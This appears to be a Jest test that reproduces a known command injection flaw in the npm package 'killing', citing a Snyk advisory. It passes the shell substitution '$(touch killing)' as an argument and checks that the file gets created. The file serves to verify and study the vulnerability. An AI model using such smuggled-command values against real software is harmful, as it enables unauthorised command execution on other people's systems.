//problem is the program dosent end


//https://snyk.io/vuln/SNYK-JS-KILLING-1078532
test("Command Injection in killing", () => 
{
    const killing = require('killing');
	const fs = require('fs')
	const path = './killing'
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	killing('$(touch killing)');
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
